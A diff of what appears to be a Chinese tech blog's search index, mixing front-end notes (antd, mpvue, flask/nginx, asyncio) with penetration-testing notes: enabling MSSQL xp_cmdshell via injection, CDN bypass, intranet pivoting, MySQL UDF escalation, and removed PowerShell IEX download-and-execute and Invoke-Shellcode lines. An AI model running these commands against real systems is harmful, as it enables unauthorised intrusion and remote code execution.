@@ -37,6 +37,34 @@
       </tags>
   </entry>
   <entry>
+    <title>antd表格fixed列无滚动条情况下出现阴影排查</title>
+    <url>/2022/12/27/antd%E8%A1%A8%E6%A0%BCfixed%E5%88%97%E6%97%A0%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%83%85%E5%86%B5%E4%B8%8B%E5%87%BA%E7%8E%B0%E9%98%B4%E5%BD%B1%E6%8E%92%E6%9F%A5/</url>
+    <content><![CDATA[<blockquote>
+<p>antd 4.x</p>
+</blockquote>
+<h2 id="1-问题现象"><a href="#1-问题现象" class="headerlink" title="1.问题现象"></a>1.问题现象</h2><p>表格在横向无法滚动的情况下，右侧的fixed column依然出现了阴影样式</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-9894b3853dd9d0fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="2-在antd中定位相关代码"><a href="#2-在antd中定位相关代码" class="headerlink" title="2.在antd中定位相关代码"></a>2.在antd中定位相关代码</h2><p>审查元素后发现，该样式由 <code>.ant-table-ping-right</code> <code>.ant-table-cell-fix-right-first:after</code>两个类控制，当阴影消失后类<code>.ant-table-ping-right</code>消失</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-9a4cb1ddd0ba1787.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>在rc-table/src/table.tsx中搜索相关类名定位到了相关代码</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-9ae11a2210dc2197.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/5964747-5a0045b3a358a636.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>查看代码逻辑 <code>if (scrollWidth === clientWidth)</code> ，发现无法滚动时按正常逻辑是会 <code>setPingedRight(false)</code>的，那问题应该就出现在<code>scrollWidth</code> <code>clientWidth</code> 这两个值上</p>
+<h2 id="3-断点调试"><a href="#3-断点调试" class="headerlink" title="3.断点调试"></a>3.断点调试</h2><p>某一刻 <code>scrollWidth</code> 变的很大<code>3286</code>，观察发现此时column4没有超长溢出展示省略号</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-145d462603af1d20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>column4的单行溢出tooltip功能使用的是<code>Typography.Paragraph</code>组件，去掉溢出样式后验证表格<code>scrollWidth</code>发现正是<code>Typography.Paragraph</code>组件在计算单行溢出时导致表格<code>scrollWidth</code>变大</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-54dccb24e4e0e85e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="4-Typography-Paragraph-关键代码"><a href="#4-Typography-Paragraph-关键代码" class="headerlink" title="4.Typography.Paragraph 关键代码"></a>4.Typography.Paragraph 关键代码</h2><p>在判断单行溢出时会先设置样式<code>white-space: nowrap</code>使文字不换行，然后判断<code>rangeWidth &gt; textEleWidth</code>或者<code>scrollWidth &gt; offsetWidth</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5964747-54dccb24e4e0e85e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h2 id="5-解决方案"><a href="#5-解决方案" class="headerlink" title="5.解决方案"></a>5.解决方案</h2><p>使用<code>Typography.Paragraph</code>的多行溢出，rows&gt;1</p>
+]]></content>
+      <categories>
+        <category>WEB前端</category>
+      </categories>
+      <tags>
+        <tag>antd</tag>
+      </tags>
+  </entry>
+  <entry>
     <title> 内网渗透之进入内网		</title>
     <url>/2018/08/05/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91/</url>
     <content><![CDATA[<h3 id="1-msf"><a href="#1-msf" class="headerlink" title="1.msf"></a>1.msf</h3><p>拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网</p>
@@ -70,6 +98,25 @@ ew -s rssocks -d 本机ip -e 888
 
 接下来就可以配置全局代理软件访问本机1008端口使用靶机socks服务了
 </code></pre>]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> 绕过CDN查找真实ip		</title>
+    <url>/2018/09/02/e7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip/</url>
+    <content><![CDATA[<blockquote>
+<p>可通过多地ping的方法，判断是否加了cdn</p>
+</blockquote>
+<ul>
+<li>内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。</li>
+<li>扫描测试文件，如phpinfo，test等</li>
+<li>子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip</li>
+<li>国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了</li>
+<li>域名的解析记录。通过在线网站（<a href="http://site.ip138.com）" target="_blank" rel="noopener">http://site.ip138.com）</a> ，查询域名的历史解析记录和当前解析记录</li>
+<li>app。目标网可能有自己的app，通过抓包可能获得到目标真实ip</li>
+</ul>
+]]></content>
       <categories>
         <category>WEB安全</category>
       </categories>
@@ -125,82 +172,45 @@ ew -s rssocks -d 本机ip -e 888
       </categories>
   </entry>
   <entry>
-    <title> 绕过CDN查找真实ip		</title>
-    <url>/2018/09/02/e7-bb-95-e8-bf-87cdn-e6-9f-a5-e6-89-be-e7-9c-9f-e5-ae-9eip/</url>
+    <title>mpvue踩坑之旅</title>
+    <url>/2020/03/16/mpvue%E8%B8%A9%E5%9D%91%E4%B9%8B%E6%97%85/</url>
     <content><![CDATA[<blockquote>
-<p>可通过多地ping的方法，判断是否加了cdn</p>
+<p>mpvue可以运行在小程序环境中，从而为小程序开发引入了整套 Vue.js 开发体验。<a href="http://mpvue.com/mpvue/" target="_blank" rel="noopener">http://mpvue.com/mpvue/</a></p>
 </blockquote>
 <ul>
-<li>内部邮箱。一般邮件系统都在内部，没有经过cdn的解析，通过目标网站用户注册或者rss订阅功能，寻找邮件头中的邮件服务器ip。</li>
-<li>扫描测试文件，如phpinfo，test等</li>
-<li>子域名。很多网站都只给主域名加了cdn，可以通过ping子域名获取到真实ip</li>
-<li>国外访问。 国内的cdn往往只对国内用户的访问加速，而国外的就不一定了</li>
-<li>域名的解析记录。通过在线网站（<a href="http://site.ip138.com）" target="_blank" rel="noopener">http://site.ip138.com）</a> ，查询域名的历史解析记录和当前解析记录</li>
-<li>app。目标网可能有自己的app，通过抓包可能获得到目标真实ip</li>
+<li>引入sass<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm i -D sass-loader node-sass</span><br><span class="line">由于webpack版本太低，所以sass-loader的版本也得低一些，<span class="number">7</span>，<span class="number">6</span>都可</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<a id="more"></a>
+<ul>
+<li><p>引入sass全局文件</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install sass-loader node-sass --save-dev</span><br><span class="line"></span><br><span class="line">npm install sass-resources-loader --save-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改mpvue的配置文件build/utils.js</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    css: generateLoaders(),</span><br><span class="line">    wxss: generateLoaders(),</span><br><span class="line">    postcss: generateLoaders(),</span><br><span class="line">    less: generateLoaders(<span class="string">'less'</span>),</span><br><span class="line">    sass: generateLoaders(<span class="string">'sass'</span>, &#123; <span class="attr">indentedSyntax</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">    <span class="comment">//修改开始</span></span><br><span class="line">    scss: generateLoaders(<span class="string">'sass'</span>).concat(</span><br><span class="line">      &#123;</span><br><span class="line">        loader: <span class="string">'sass-resources-loader'</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          resources: path.resolve(__dirname, <span class="string">'../src/global.scss'</span>)</span><br><span class="line">          <span class="comment">// 此路径就是你定义全局scss变量的路径，可随你自己的更改</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="comment">//修改结束</span></span><br><span class="line">    stylus: generateLoaders(<span class="string">'stylus'</span>),</span><br><span class="line">    styl: generateLoaders(<span class="string">'stylus'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>引入第三方微信小程序组件库</p>
+</li>
+</ul>
+<ol>
+<li>将组件库下载至static文件夹</li>
+<li>在需要引入组件的页面新建配置文件main.json</li>
+<li>配置usingComponents<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"usingComponents"</span>: &#123;</span><br><span class="line">        <span class="string">"i-icon"</span>: <span class="string">"../../../static/ivew/icon/index"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>监听组件的事件</li>
+</ul>
+<ol>
+<li>mpvue对这些事件对象进行了包装，原本可以直接通过函数接收的event对象被包装到了mp属性中</li>
+<li>mpvue不支持对vue的自定义组件绑定click 等<code>原生事件</code>，需要在组件内部自行emit事件</li>
+</ol>
+<ul>
+<li>所有页面vue生命周期函数中的beforeCreate和created是一起执行的,可以使用mounted,beforeMount,onshow,onhide等代替</li>
 </ul>
 ]]></content>
       <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title> flask+nginx+uwsgi配置		</title>
-    <url>/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/</url>
-    <content><![CDATA[<h3 id="uwsgi配置（-ini）"><a href="#uwsgi配置（-ini）" class="headerlink" title="uwsgi配置（.ini）"></a>uwsgi配置（.ini）</h3><pre><code>[uwsgi]
-socket = 127.0.0.1:5001 #监听的端口，或者用socket文件，/tmp/uwsgi.sock
-chdir = /python-test/tea/ #项目主目录,放在程序主目录下，可不写
-wsgi-file = manage.py  #项目启动文件
-callable = app  #主应用名
-processes = 4   #开启进程数
-buffer-size = 65535
-master = true #允许uwsgi主进程
-plugins = python #解决python与uwsgi兼容问题
-#sudo apt-get install uwsgi-plugin-python
-uid=1000 #设置运行用户uid/用户名
-gid=1000 #用户组id
-disable-logging=true #不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中
-logto =uwsgi_web.log
-virtualenv＝/home/proj/virtualenv #python虚拟环境
-</code></pre><a id="more"></a>
-<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><pre><code>server {
-    listen       1234;#web服务监听端口
-    server_name  0.0.0.0;#域名/ip
-    location / {
-        include      uwsgi_params;
-        uwsgi_pass   127.0.0.1:5001;#uwsgi监听的端口或者socket文件，unix:/tmp/uwsgi.sock,nginx需要有对文件的写权限
-    }
-}
-</code></pre>]]></content>
-      <categories>
         <category>WEB前端/后端</category>
       </categories>
-  </entry>
-  <entry>
-    <title>antd表格fixed列无滚动条情况下出现阴影排查</title>
-    <url>/2022/12/27/antd%E8%A1%A8%E6%A0%BCfixed%E5%88%97%E6%97%A0%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%83%85%E5%86%B5%E4%B8%8B%E5%87%BA%E7%8E%B0%E9%98%B4%E5%BD%B1%E6%8E%92%E6%9F%A5/</url>
-    <content><![CDATA[<blockquote>
-<p>antd 4.x</p>
-</blockquote>
-<h2 id="1-问题现象"><a href="#1-问题现象" class="headerlink" title="1.问题现象"></a>1.问题现象</h2><p>表格在横向无法滚动的情况下，右侧的fixed column依然出现了阴影样式</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5964747-9894b3853dd9d0fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<h2 id="2-在antd中定位相关代码"><a href="#2-在antd中定位相关代码" class="headerlink" title="2.在antd中定位相关代码"></a>2.在antd中定位相关代码</h2><p>审查元素后发现，该样式由 <code>.ant-table-ping-right</code> <code>.ant-table-cell-fix-right-first:after</code>两个类控制，当阴影消失后类<code>.ant-table-ping-right</code>消失</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5964747-9a4cb1ddd0ba1787.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>在rc-table/src/table.tsx中搜索相关类名定位到了相关代码</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5964747-9ae11a2210dc2197.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br><img src="https://upload-images.jianshu.io/upload_images/5964747-5a0045b3a358a636.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>查看代码逻辑 <code>if (scrollWidth === clientWidth)</code> ，发现无法滚动时按正常逻辑是会 <code>setPingedRight(false)</code>的，那问题应该就出现在<code>scrollWidth</code> <code>clientWidth</code> 这两个值上</p>
-<h2 id="3-断点调试"><a href="#3-断点调试" class="headerlink" title="3.断点调试"></a>3.断点调试</h2><p>某一刻 <code>scrollWidth</code> 变的很大<code>3286</code>，观察发现此时column4没有超长溢出展示省略号</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5964747-145d462603af1d20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<p>column4的单行溢出tooltip功能使用的是<code>Typography.Paragraph</code>组件，去掉溢出样式后验证表格<code>scrollWidth</code>发现正是<code>Typography.Paragraph</code>组件在计算单行溢出时导致表格<code>scrollWidth</code>变大</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5964747-54dccb24e4e0e85e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<h2 id="4-Typography-Paragraph-关键代码"><a href="#4-Typography-Paragraph-关键代码" class="headerlink" title="4.Typography.Paragraph 关键代码"></a>4.Typography.Paragraph 关键代码</h2><p>在判断单行溢出时会先设置样式<code>white-space: nowrap</code>使文字不换行，然后判断<code>rangeWidth &gt; textEleWidth</code>或者<code>scrollWidth &gt; offsetWidth</code></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/5964747-54dccb24e4e0e85e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
-<h2 id="5-解决方案"><a href="#5-解决方案" class="headerlink" title="5.解决方案"></a>5.解决方案</h2><p>使用<code>Typography.Paragraph</code>的多行溢出，rows&gt;1</p>
-]]></content>
-      <categories>
-        <category>WEB前端</category>
-      </categories>
       <tags>
-        <tag>antd</tag>
+        <tag>mpvue</tag>
       </tags>
   </entry>
   <entry>
@@ -250,46 +260,58 @@ DROP DATABASE test;
       </categories>
   </entry>
   <entry>
-    <title>mpvue踩坑之旅</title>
-    <url>/2020/03/16/mpvue%E8%B8%A9%E5%9D%91%E4%B9%8B%E6%97%85/</url>
-    <content><![CDATA[<blockquote>
-<p>mpvue可以运行在小程序环境中，从而为小程序开发引入了整套 Vue.js 开发体验。<a href="http://mpvue.com/mpvue/" target="_blank" rel="noopener">http://mpvue.com/mpvue/</a></p>
-</blockquote>
-<ul>
-<li>引入sass<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm i -D sass-loader node-sass</span><br><span class="line">由于webpack版本太低，所以sass-loader的版本也得低一些，<span class="number">7</span>，<span class="number">6</span>都可</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<a id="more"></a>
-<ul>
-<li><p>引入sass全局文件</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">npm install sass-loader node-sass --save-dev</span><br><span class="line"></span><br><span class="line">npm install sass-resources-loader --save-dev</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改mpvue的配置文件build/utils.js</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    css: generateLoaders(),</span><br><span class="line">    wxss: generateLoaders(),</span><br><span class="line">    postcss: generateLoaders(),</span><br><span class="line">    less: generateLoaders(<span class="string">'less'</span>),</span><br><span class="line">    sass: generateLoaders(<span class="string">'sass'</span>, &#123; <span class="attr">indentedSyntax</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">    <span class="comment">//修改开始</span></span><br><span class="line">    scss: generateLoaders(<span class="string">'sass'</span>).concat(</span><br><span class="line">      &#123;</span><br><span class="line">        loader: <span class="string">'sass-resources-loader'</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          resources: path.resolve(__dirname, <span class="string">'../src/global.scss'</span>)</span><br><span class="line">          <span class="comment">// 此路径就是你定义全局scss变量的路径，可随你自己的更改</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="comment">//修改结束</span></span><br><span class="line">    stylus: generateLoaders(<span class="string">'stylus'</span>),</span><br><span class="line">    styl: generateLoaders(<span class="string">'stylus'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>引入第三方微信小程序组件库</p>
-</li>
-</ul>
-<ol>
-<li>将组件库下载至static文件夹</li>
-<li>在需要引入组件的页面新建配置文件main.json</li>
-<li>配置usingComponents<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"usingComponents"</span>: &#123;</span><br><span class="line">        <span class="string">"i-icon"</span>: <span class="string">"../../../static/ivew/icon/index"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ul>
-<li>监听组件的事件</li>
-</ul>
-<ol>
-<li>mpvue对这些事件对象进行了包装，原本可以直接通过函数接收的event对象被包装到了mp属性中</li>
-<li>mpvue不支持对vue的自定义组件绑定click 等<code>原生事件</code>，需要在组件内部自行emit事件</li>
-</ol>
-<ul>
-<li>所有页面vue生命周期函数中的beforeCreate和created是一起执行的,可以使用mounted,beforeMount,onshow,onhide等代替</li>
-</ul>
-]]></content>
+    <title> flask+nginx+uwsgi配置		</title>
+    <url>/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/</url>
+    <content><![CDATA[<h3 id="uwsgi配置（-ini）"><a href="#uwsgi配置（-ini）" class="headerlink" title="uwsgi配置（.ini）"></a>uwsgi配置（.ini）</h3><pre><code>[uwsgi]
+socket = 127.0.0.1:5001 #监听的端口，或者用socket文件，/tmp/uwsgi.sock
+chdir = /python-test/tea/ #项目主目录,放在程序主目录下，可不写
+wsgi-file = manage.py  #项目启动文件
+callable = app  #主应用名
+processes = 4   #开启进程数
+buffer-size = 65535
+master = true #允许uwsgi主进程
+plugins = python #解决python与uwsgi兼容问题
+#sudo apt-get install uwsgi-plugin-python
+uid=1000 #设置运行用户uid/用户名
+gid=1000 #用户组id
+disable-logging=true #不记录请求信息的日志。只记录错误以及uWSGI内部消息到日志中
+logto =uwsgi_web.log
+virtualenv＝/home/proj/virtualenv #python虚拟环境
+</code></pre><a id="more"></a>
+<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><pre><code>server {
+    listen       1234;#web服务监听端口
+    server_name  0.0.0.0;#域名/ip
+    location / {
+        include      uwsgi_params;
+        uwsgi_pass   127.0.0.1:5001;#uwsgi监听的端口或者socket文件，unix:/tmp/uwsgi.sock,nginx需要有对文件的写权限
+    }
+}
+</code></pre>]]></content>
       <categories>
         <category>WEB前端/后端</category>
       </categories>
-      <tags>
-        <tag>mpvue</tag>
-      </tags>
+  </entry>
+  <entry>
+    <title> Mssql开启xp_cmdshell		</title>
+    <url>/2018/07/29/mssql-e5-bc-80-e5-90-afxp-cmdshell/</url>
+    <content><![CDATA[<h5 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1; //显示或修改高级选项
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;,0;
+RECONFIGURE;
+</code></pre><a id="more"></a>
+<h5 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h5><pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1;
+RECONFIGURE;
+EXEC sp_configure &apos;xp_cmdshell&apos;, 1;
+RECONFIGURE;
+</code></pre><p>在注入点运行上述语句时,如果出现这样的回显,<code>标记message: 配置选项 &#39;xp_cmdshell&#39; 不存在</code>,可执行以下语句</p>
+<pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;
+RECONFIGURE;
+EXEC sp_configure &apos;user connections&apos;,1;
+RECONFIGURE;
+</code></pre>]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
   </entry>
   <entry>
     <title> Mysql udf提权		</title>
@@ -310,52 +332,6 @@ select &apos;xxx&apos; into dumpfile &apos;D:/phpstudy/MySQL/lib/plugin::$INDEX_
 select cmdshell(&apos;whoami&apos;);
 drop function cmdshell; 删除函数
 delete from mysql.func where name=&apos;cmdshell&apos;  删除函数
-</code></pre>]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title> Nishang/PowerSploit		</title>
-    <url>/2018/08/05/nishang-powersploit/</url>
-    <content><![CDATA[<blockquote>
-<p>nishang/powersploit都是针对powershell的渗透工具，提供了丰富powershell脚本，在后渗透的时候，不需要在靶机上上传任何工具，只要一个powershell，就可以远程下载执行脚本</p>
-</blockquote>
-<h3 id="1-Powershell"><a href="#1-Powershell" class="headerlink" title="1.Powershell"></a>1.Powershell</h3><p>查看执行策略</p>
-<pre><code>Get-ExecutionPolicy
-
-Restricted  //这是默认的设置。不能执行PowerShell脚本
-AllSigned   //只有数字签名的脚本将会运行，此外，会提示你允许运行那些使用指定的证书签名的脚本
-RemoteSigned    //经本地编写的脚本将会运行，从网络下载的脚本运行，除非他们签名了并且你批准了的签名的证书
-UnRestricted    //所有的脚本都将运行
-</code></pre><a id="more"></a>
-<p>设置执行策略，需要管理员权限</p>
-<pre><code>set-ExecutionPolicy
-</code></pre><p>绕过执行策略执行脚本</p>
-<pre><code>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1
-
-//远程下载执行
-IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)
-在cmd模式下:
-powershell IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)
-powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;url&apos;)&quot;
-</code></pre><h3 id="2-Nishang"><a href="#2-Nishang" class="headerlink" title="2.Nishang"></a>2.Nishang</h3><p>导入所有模块nishang</p>
-<pre><code>import-module ./nishang.psm1
-
-get-command -module nishang     //查看命令
-</code></pre><p>单独导入Invoke-PortScan脚本</p>
-<pre><code>IEX (New-Object Net.WebClient).DownloadString(“http://localhost/webTools/nishang/Scan/Invoke-PortScan.ps1”)
-
-get-help Invoke-PortScan //查看使用方法
-</code></pre><p>nishang提供了丰富的脚本 <img src="https://s1.ax1x.com/2018/08/05/PDo9gA.png" alt="PDo9gA.png"></p>
-<h3 id="3-PowerSploit"><a href="#3-PowerSploit" class="headerlink" title="3.PowerSploit"></a>3.PowerSploit</h3><blockquote>
-<p>用法和nishang一样，有些重叠脚本</p>
-</blockquote>
-<p>Invoke-Shellcode:将shellcode插入您选择的进程ID或本地PowerShell中</p>
-<pre><code>IEX (New-Object Net.WebClient).DownloadString(“http://Invoke-Shellcode.ps1”) //导入Invoke-Shellcode脚本
-IEX (New-Object Net.WebClient).DownloadString(“http://msf.ps1”) //导入msfvenom生成的木马
-Invoke-Shellcode -Shellcode ($buf) //直接运行
-Invoke-Shellcode -ProcessID id -Shellcode($buf) -Force //进程注入运行
 </code></pre>]]></content>
       <categories>
         <category>WEB安全</category>
@@ -413,99 +389,6 @@ location ~* \.(gif|jpg|jpeg)$ {
 ]]></content>
       <categories>
         <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title> Python异步IO		</title>
-    <url>/2018/09/09/python-e5-bc-82-e6-ad-a5io/</url>
-    <content><![CDATA[<blockquote>
-<p>asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。我们从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。</p>
-</blockquote>
-<h3 id="1-asyncio-coroutine-yield-from"><a href="#1-asyncio-coroutine-yield-from" class="headerlink" title="1.@ asyncio.coroutine/yield from"></a>1.@ asyncio.coroutine/yield from</h3><ul>
-<li><font color="#ff2a2a">@asyncio.coroutine</font>把一个函数标记为协程</li>
-<li><code>yield from</code>针对耗时的操作进行挂起，函数让出控制权<a id="more"></a>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now = <span class="keyword">lambda</span> : time.time()</span><br><span class="line"></span><br><span class="line"><span class="meta">@asyncio.coroutine</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_some_work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; start"</span>.format(x))</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"&#123;&#125; end"</span>.format(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = now()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [asyncio.ensure_future(do_some_work(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">print(<span class="string">"Time:"</span>,now()-start)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="2-async-await"><a href="#2-async-await" class="headerlink" title="2.async/await"></a>2.async/await</h3><ul>
-<li><code>async</code>代替<font color="#ff2a2a">@asyncio.coroutine</font></li>
-<li><code>await</code>代替<code>yield from</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">now = <span class="keyword">lambda</span> : time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">do_some_work</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125; start"</span>.format(x))</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">"&#123;&#125; end"</span>.format(x))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start = now()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [asyncio.ensure_future(do_some_work(i)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">print(<span class="string">"Time:"</span>,now()-start)</span><br></pre></td></tr></table></figure>
-<h3 id="3-aiohttp"><a href="#3-aiohttp" class="headerlink" title="3.aiohttp"></a>3.aiohttp</h3><pre><code>import asyncio
-import aiohttp
-
-
-async def task(url):
-    print(&apos;start {}&apos;.format(url))
-    async with aiohttp.ClientSession() as session:
-        async with session.get(url) as resp:
-            content=await resp.text()
-            print(&apos;{1} bytes from {0}&apos;.format(url,len(content)))
-
-urls=[&apos;https://github.com/&apos;,&apos;https://www.baidu.com/&apos;,&apos;https://www.python.org/&apos;]
-
-event_loop=asyncio.get_event_loop()
-
-tasks=[asyncio.ensure_future(task(i)) for i in urls]
-
-event_loop.run_until_complete(asyncio.wait(tasks))
-</code></pre><h3 id="4-gevent"><a href="#4-gevent" class="headerlink" title="4.gevent"></a>4.gevent</h3><ul>
-<li>python通过yield提供了对协程的基本支持，但是不完全。而第三方的gevent为Python提供了比较完善的协程支持。</li>
-<li>monkey.patch_all()将python的一些标准库(thread/socket等)改成非阻塞</li>
-<li>遇到io阻塞自动挂起，执行其他任务</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'GET: %s'</span> % url)</span><br><span class="line">    resp = request.urlopen(url)</span><br><span class="line">    data = resp.read()</span><br><span class="line">    print(<span class="string">'%d bytes received from %s.'</span> % (len(data), url))</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://github.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://www.baidu.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">' https://www.python.org/'</span>),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>WEB前端/后端</category>
-      </categories>
-  </entry>
-  <entry>
-    <title> Python3 MRO与super		</title>
-    <url>/2019/02/19/python-mro-e4-b8-8esuper/</url>
-    <content><![CDATA[<h3 id="0x1-MRO"><a href="#0x1-MRO" class="headerlink" title="0x1 MRO"></a>0x1 MRO</h3><ul>
